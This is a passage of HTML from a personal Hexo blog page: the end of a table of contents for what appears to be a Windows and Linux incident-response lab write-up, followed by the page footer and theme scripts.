href="#%E9%9D%9E%E6%B3%95%E7%94%A8%E6%88%B7%E5%91%BD%E4%BB%A4%EF%BC%9Awmic-useraccount-get-format-list"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">非法用户命令：wmic useraccount  get * &#x2F;format:list</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%E7%A7%B0-%E9%9D%9E%E6%B3%95%E7%94%A8%E6%88%B7%E5%91%BD%E4%BB%A4%EF%BC%9Awmic-useraccount-get-format-list"><span class="toc-number">1.3.2.</span> <span class="toc-text">[隐藏用户名称](# 非法用户命令：wmic useraccount  get * &#x2F;format:list)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E7%9A%84flag"><span class="toc-number">1.3.3.</span> <span class="toc-text">黑客留下的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">1.3.4.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">1.3.5.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">1.3.6.</span> <span class="toc-text">flag3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux1"><span class="toc-number">2.1.</span> <span class="toc-text">linux1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%AE%A2%E7%9A%84ip%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.1.</span> <span class="toc-text">黑客的ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-1"><span class="toc-number">2.1.3.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3-1"><span class="toc-number">2.1.4.</span> <span class="toc-text">flag3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux2"><span class="toc-number">2.2.</span> <span class="toc-text">Linux2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84ip"><span class="toc-number">2.2.1.</span> <span class="toc-text">提交攻击者的ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%94%BB%E5%87%BB%E8%80%85%E4%BF%AE%E6%94%B9%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%EF%BC%88%E6%98%8E%E6%96%87%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">提交攻击者修改的管理员密码（明文）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E7%AC%AC%E4%B8%80%E6%AC%A1webshell%E8%BF%9E%E6%8E%A5%E7%9A%84URL-%E5%8F%AA%E7%94%A8%E4%BA%A4%E5%8F%82%E6%95%B0"><span class="toc-number">2.2.3.</span> <span class="toc-text">提交第一次webshell连接的URL(只用交参数)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AAURL%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0%E5%B0%B1%E5%9C%A8%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%A6%96%E9%83%A8%E5%8A%A0%E4%B8%8A%E4%BA%86webshell%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AAURL%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0%E5%9C%A8%E6%A0%87%E7%AD%BE%E4%BD%8D%E7%BD%AE%E5%86%99%E5%85%A5%E4%BA%86URL%EF%BC%8C%E5%B9%B6%E4%B8%94%E7%BB%99%E4%BA%86%E6%8F%90%E7%A4%BA%E6%98%AF%E5%9C%A8%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4webshell%E7%9A%84%E5%AF%86%E7%A0%81-%E7%AC%AC%E4%B8%80%E4%B8%AAURL%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0%E5%B0%B1%E5%9C%A8%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E9%A6%96%E9%83%A8%E5%8A%A0%E4%B8%8A%E4%BA%86webshell%EF%BC%8C%E7%AC%AC%E4%BA%8C%E4%B8%AAURL%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0%E5%9C%A8%E6%A0%87%E7%AD%BE%E4%BD%8D%E7%BD%AE%E5%86%99%E5%85%A5%E4%BA%86URL%EF%BC%8C%E5%B9%B6%E4%B8%94%E7%BB%99%E4%BA%86%E6%8F%90%E7%A4%BA%E6%98%AF%E5%9C%A8%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%B3%A8%E5%86%8C%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.2.4.</span> <span class="toc-text">[提交webshell的密码](# 第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84flag1"><span class="toc-number">2.2.5.</span> <span class="toc-text">提交数据包的flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%94%BB%E5%87%BB%E8%80%85%E5%90%8E%E7%BB%AD%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%90%8D%E7%A7%B0"><span class="toc-number">2.2.6.</span> <span class="toc-text">提交攻击者后续上传木马名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2-2"><span class="toc-number">2.2.7.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3-2"><span class="toc-number">2.2.8.</span> <span class="toc-text">flag3</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By 0xYyssh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/sakura.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="YOU,LOVE,ME" data-fontsize="8px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
